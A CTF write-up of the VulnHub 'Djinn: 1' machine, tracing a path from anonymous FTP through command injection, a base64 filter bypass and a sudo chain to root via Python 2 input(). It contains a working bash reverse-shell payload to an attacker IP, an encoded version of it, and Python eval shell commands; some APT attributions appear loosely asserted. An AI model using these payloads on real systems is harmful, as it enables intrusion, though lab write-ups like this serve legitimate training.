# Djinn: 1 — Three Wishes, One Root Shell

You pop open an FTP server, play a math riddle game over netcat, bypass a command injection filter with base64, hop through two users, and end up tricking a Python 2 binary into giving you root. The machine is literally a genie in a bottle: it grants wishes, but the real wish is a root shell. Dude, the theming here is legit chef's kiss. ✨

| Field | Value |
|---|---|
| **Level** | Medium |
| **Target VM** | Djinn: 1 |
| **Attacker VM** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/djinn-1,397/ |
| **Techniques** | FTP anonymous access, OS command injection, base64 filter bypass, Python library credential leak, multi-hop sudo chain, Python 2 input() code execution |
| **CVEs** | CWE-78 (OS Command Injection — /wish endpoint), CWE-269 (Improper Privilege Management — sudo chain), CWE-116 (Python 2 input() eval abuse) |
| **APT Groups** | APT41: exploits command injection in web-facing applications for initial access in enterprise targets; Lazarus Group: uses multi-hop privilege escalation chains via sudo misconfiguration in post-exploitation phases |

---

## Attack Summary

```
nmap: ports 21 (FTP), 1337 (game), 7331 (HTTP)
    |
    v
FTP anonymous login → creds.txt, game.txt, message.txt
    |
    v
Port 7331: gobuster → /wish endpoint (command injection)
    |
    v
/wish: OS command injection confirmed (id)
    |
    v
Filter blocks keywords → base64-encode payload → pipe to bash
    |
    v
Reverse shell as www-data
    |
    v
/opt/80/app.py → /home/nitish/.dev/creds.txt → su nitish
    |
    v
sudo -u sam genie -cmd new → shell as sam
    |
    v
sudo /root/lago → Python 2 input() → eval("__import__('os').system('/bin/bash')")
    |
    v
uid=0(root) → /root/proof.sh
```

---

## Methodology

1. Host discovery and port scan: FTP (21), game service (1337), HTTP (7331), SSH filtered
2. FTP anonymous login: download credential hints, game description, and note
3. Web enumeration on port 7331: find the `/wish` command injection endpoint
4. Exploit OS command injection: bypass keyword filter with base64-encoded payload
5. Gain reverse shell as `www-data`
6. Find credentials in application source and pivot to `nitish`
7. Abuse `sudo genie` rule to move to `sam`
8. Exploit Python 2 `input()` via `sudo lago` to escalate to root

---

## Step 1 — Host Discovery and Port Scan

Start with a full port scan to find every service:

```bash
sudo netdiscover -r 192.168.43.0/24
# Target: 192.168.43.134

nmap -p- -sV -sC 192.168.43.134
```

Expected output:

```
PORT     STATE    SERVICE VERSION
21/tcp   open     ftp     vsftpd 3.0.3
1337/tcp open     waste?
7331/tcp open     http    Werkzeug httpd
22/tcp   filtered ssh
```

Four interesting entries: FTP is anonymous-friendly, 1337 is mystery, 7331 is a Python web app, and SSH is filtered (only accessible after something changes). No cap, that 1337 port screams CTF energy.

**Real-world note:** Leaving FTP open with anonymous access on a machine that also runs a web app is a classic misconfiguration. APT41 has used anonymous FTP servers as staging areas for payloads and credential hints in intrusions targeting Asian financial institutions.

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — FTP Anonymous Login

```bash
ftp 192.168.43.134
# Username: anonymous
# Password: (blank or anonymous)

ftp> ls -la
ftp> get creds.txt
ftp> get game.txt
ftp> get message.txt
ftp> quit
```

Read the files:

```bash
cat creds.txt
# nitish:p4ssw0rdStr3r0n9  (SSH creds — but SSH is filtered for now)

cat message.txt
# Message from the server admin, hints about the game on port 1337

cat game.txt
# Description of the number guessing game
```

The SSH credentials are useless right now (port 22 is filtered). But they will be needed later, after we get a foothold.

**Real-world note:** Organizations that run anonymous FTP for legacy file sharing routinely expose internal documentation and credential hints. Even when the credentials are not directly usable, the information provides valuable context for the rest of the attack chain.

**MITRE ATT&CK:** T1021.003 — Remote Services (FTP access), T1083 — File and Directory Discovery

---

## Step 3 — Web Enumeration on Port 7331

Browse to `http://192.168.43.134:7331/` — you get a basic page. Run directory brute-force:

```bash
gobuster dir \
  -u http://192.168.43.134:7331 \
  -w /usr/share/wordlists/dirb/big.txt \
  -t 40
```

Results:

```
/genie    (Status: 403)
/wish     (Status: 200)
```

The `/genie` endpoint is forbidden, but `/wish` is accessible. Browse to it: you get a text input field. This is the genie's wish-granting interface.

**Alternative:** `feroxbuster -u http://192.168.43.134:7331 -w /usr/share/seclists/Discovery/Web-Content/common.txt` — faster recursive enumeration.

**MITRE ATT&CK:** T1083 — File and Directory Discovery

---

## Step 4 — OS Command Injection on /wish

Submit `id` in the form field. The response displays:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Command injection confirmed. fr fr, that was easy. Now try a reverse shell:

```bash
# Direct attempt:
bash -i >& /dev/tcp/192.168.43.249/8080 0>&1
```

Response: "Wrong choice of words" — there is a keyword filter active. The filter blocks shell-related keywords like `bash`, `&`, `/dev/tcp`, `python`, `nc`, etc.

**Real-world note:** Input-based command injection (CWE-78) consistently ranks in the OWASP Top 10 (A03:2021 — Injection). The combination of an exposed command execution endpoint and an inadequate keyword filter mirrors real-world cases documented in multiple HackerOne reports for SaaS platforms.

**MITRE ATT&CK:** T1059.004 — Command and Scripting Interpreter: Unix Shell

---

## Step 5 — Filter Bypass via Base64

Encode the reverse shell payload to bypass keyword detection:

```bash
# Payload: bash -i >& /dev/tcp/192.168.43.249/8080 0>&1
echo "bash -i >& /dev/tcp/192.168.43.249/8080 0>&1" | base64
# Output: YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQzLjI0OS84MDgwIDA+JjEK
```

Start the listener:

```bash
nc -nlvp 8080
```

Submit the bypass payload in the `/wish` form:

```
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQzLjI0OS84MDgwIDA+JjEK | base64 -d | bash
```

This uses only `echo`, `base64`, and `bash` — none of the specific blocked keywords. The shell arrives as `www-data`. Nailed it!

**Alternative:** Use a hex-encoded payload piped through `xxd -r -p | bash` or a curl-fetched payload from an attacker-hosted HTTP server.

**Real-world note:** Base64 filter bypass is one of the most documented command injection filter bypass techniques. Any keyword blocklist is fundamentally flawed because the attack space is infinite. The correct fix is to never pass user input to shell commands — use parameterized APIs.

**MITRE ATT&CK:** T1027 — Obfuscated Files or Information, T1059.004 — Command and Scripting Interpreter: Unix Shell

---

## Step 6 — Shell Stabilization and Lateral Movement to nitish

Stabilize the shell:

```bash
python -c 'import pty;pty.spawn("/bin/sh")'
export TERM=xterm
# Ctrl+Z → stty raw -echo; fg → Enter
```

Examine the web application source:

```bash
cat /opt/80/app.py
# References a creds.txt path
```

Read the credential file:

```bash
cat /home/nitish/.dev/creds.txt
# nitish:p4ssw0rdStr3r0n9
```

Switch user:

```bash
su nitish
# Password: p4ssw0rdStr3r0n9
id
# uid=1001(nitish)

cat /home/nitish/user.txt
```

**Real-world note:** Storing credentials in application source code or accessible configuration files is one of the most common findings in web application assessments. The 2022 Uber breach involved credentials committed to an internal Git repository, leading to cloud infrastructure access.

**MITRE ATT&CK:** T1552.001 — Credentials in Files

---

## Step 7 — Lateral Movement to sam via sudo

Check sudo permissions for nitish:

```bash
sudo -l
```

Output:

```
(sam) NOPASSWD: /usr/bin/genie
```

Nitish can run `genie` as `sam` without a password. Use the `genie` binary's `-cmd` flag:

```bash
sudo -u sam genie -cmd new
id
# uid=1002(sam)
```

Shell as `sam` obtained. Multi-hop sudo chains like this are a very real enterprise attack pattern: one compromised service account cascades to another, then to root.

**MITRE ATT&CK:** T1548.003 — Abuse Elevation Control Mechanism: Sudo

---

## Step 8 — Privilege Escalation via Python 2 input() Abuse

Check sam's sudo permissions:

```bash
sudo -l
```

Output:

```
(root) NOPASSWD: /root/lago
```

Run it:

```bash
sudo -u root /root/lago
```

The binary presents a menu. Choose **option 2** and type `num` at the input prompt:

```
Choose option: 2
Enter value: num
```

What happens: in Python 2, `input()` is equivalent to `eval(raw_input(...))`. When you type a variable name like `num`, Python evaluates it as a Python expression. `num` is not defined, so it raises a `NameError` — but more importantly, you can submit any valid Python expression:

```
Enter value: __import__('os').system('/bin/bash')
```

This executes `/bin/bash` as root. GG!

```bash
id
# uid=0(root) gid=0(root) groups=0(root)

cd /root
./proof.sh
```

**Alternative:** `__import__('os').execl('/bin/sh','sh')` or any other Python expression that spawns a shell.

**Real-world note:** Python 2 reached end-of-life on January 1, 2020. Scripts using `input()` in Python 2 for any privileged operation are code execution vulnerabilities. This exact pattern (Python 2 `input()` with sudo) has been found in production deployment scripts at several organizations during penetration tests.

**MITRE ATT&CK:** T1059.006 — Command and Scripting Interpreter: Python, T1548.003 — Abuse Elevation Control Mechanism: Sudo

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Used/Cracked |
|---|---|---|---|
| SSH credential | `nitish:p4ssw0rdStr3r0n9` | FTP `creds.txt` + `/home/nitish/.dev/creds.txt` | SSH (filtered) and su nitish |
| User flag | Contents of `/home/nitish/user.txt` | After lateral move to nitish | Proof of user |
| Root proof | Output of `/root/proof.sh` | After Python 2 input() exploit | Final flag |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | FTP anonymous access exposing credential hints | Legacy FTP with anonymous access is consistently found in enterprise networks; even non-critical data leaks attack context | Disable anonymous FTP; migrate to SFTP with key-based authentication |
| 2 | Command injection on `/wish` with keyword filter | Keyword blocklists are security theater; any character filter for command injection is fundamentally bypassable | Never pass user input to shell commands; use parameterized APIs and subprocess modules with argument lists |
| 3 | Credentials in `/home/nitish/.dev/creds.txt` readable by www-data | Application source code and config files routinely contain hardcoded credentials — a top finding in every DAST scan | Apply least-privilege file permissions; use secrets managers; scan code and configs for hardcoded credentials |
| 4 | Multi-hop sudo chain (nitish → sam → root) | Multi-hop privilege escalation through service accounts is a documented enterprise attack pattern | Audit sudo rules; remove unnecessary grants; require passwords for all sudo usage |
| 5 | Python 2 input() evaluated as Python code | Python 2 EOL means no patches for this class of vulnerability; scripts using input() in Python 2 are code execution bugs if run with elevated privileges | Migrate to Python 3; never use eval or input() on user-supplied data in privileged scripts |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Reconnaissance | Discovery | File and Directory Discovery | T1083 |
| Initial Access | Initial Access | Exploit Public-Facing Application | T1190 |
| Execution | Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Defense Evasion | Defense Evasion | Obfuscated Files or Information | T1027 |
| Credential Access | Credential Access | Credentials in Files | T1552.001 |
| Lateral Movement | Lateral Movement | (su to nitish, then sam) | T1021 |
| Privilege Escalation | Privilege Escalation | Abuse Elevation Control Mechanism: Sudo | T1548.003 |
| Execution | Execution | Command and Scripting Interpreter: Python | T1059.006 |

---

## Remediation and Containment

### Technical Fixes

1. **Disable anonymous FTP** — set `anonymous_enable=NO` in vsftpd.conf; migrate file sharing to SFTP with key authentication
2. **Fix command injection on /wish** — replace `os.system(user_input)` with a parameterized subprocess call; never pass user input directly to shell execution
3. **Remove keyword-based input filter** — blocklists for shell injection are unworkable; implement allowlist validation for expected input types
4. **Rotate credentials in exposed files** — remove `/home/nitish/.dev/creds.txt`; manage secrets via environment variables or a secrets manager
5. **Audit and restrict sudo rules** — remove the nitish→sam and sam→root sudo grants; if genie/lago must be run as another user, require passwords and restrict the specific operation
6. **Migrate Python 2 scripts to Python 3** — `input()` in Python 3 is safe; Python 2 `input()` must never be used in privileged scripts
7. **Apply least-privilege permissions** — application config files and credential stores must not be readable by web server processes

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory all FTP services and web application endpoints |
| Protect | Access Control | Disable anonymous FTP; restrict file permissions on credential files |
| Protect | Data Security | Move secrets to secrets manager; no plaintext credentials in source files |
| Detect | Anomalies and Events | Alert on anomalous sudo usage; monitor /wish endpoint for injection attempts |
| Respond | Response Planning | Rotate all exposed credentials; disable vulnerable endpoints; patch Python 2 scripts |
| Recover | Recovery Planning | Rebuild compromised host; audit all sudo rules and credential files |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| AC-6 | Least Privilege | Restrict sudo grants to minimum necessary; require passwords |
| IA-5 | Authenticator Management | Rotate credentials found in /home/nitish/.dev/creds.txt |
| CM-7 | Least Functionality | Disable anonymous FTP; remove Python 2 scripts with input() in sudo context |
| SI-10 | Information Input Validation | Implement allowlist input validation on /wish; replace shell execution with safe APIs |
| SA-11 | Developer Security Testing | Mandate SAST/DAST scanning to detect command injection in web applications |

### CISA KEV

The command injection pattern on `/wish` (CWE-78) maps to vulnerability classes catalogued in multiple CISA Alerts (AA21-131A, AA22-083A) describing exploitation of web application command injection for initial access. Organizations should remediate command injection vulnerabilities as high-priority items.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Identity and Access Management (IAM) | Manage Privileges | MIL3 |
| Threat and Vulnerability Management (THREAT) | Perform Vulnerability Assessments | MIL2 |
| Asset, Change, and Configuration Management (ASSET) | Manage Software | MIL2 |

### MITRE D3FEND Countermeasures

- **D3-ACH** — Application Configuration Hardening (disable anonymous FTP; remove Python 2 sudo scripts)
- **D3-OAM** — Operating System Administrative Management (sudo restrictions; least privilege for file permissions)
- **D3-IAVV** — Input Validation (allowlist validation on /wish; replace shell execution)

---

## Final Thoughts

Djinn: 1 is a masterclass in attack chain design. Every step flows naturally from the previous one: the FTP credentials that can't be used immediately, the game port that hints at things to come, the filter bypass that rewards knowing your encoding tricks, and the Python 2 gotcha at the end.

The Python 2 `input()` escalation is especially instructive: it is a real class of vulnerability, not a CTF gimmick. Production systems running end-of-life Python 2 with `input()` in privileged scripts are genuinely exploitable in exactly this way. Any time you see a Python 2 script in a `sudo` rule, check for `input()` calls.

Three wishes granted. Root achieved. gg no re.

Thanks guys!! (❍ᴥ❍ʋ)
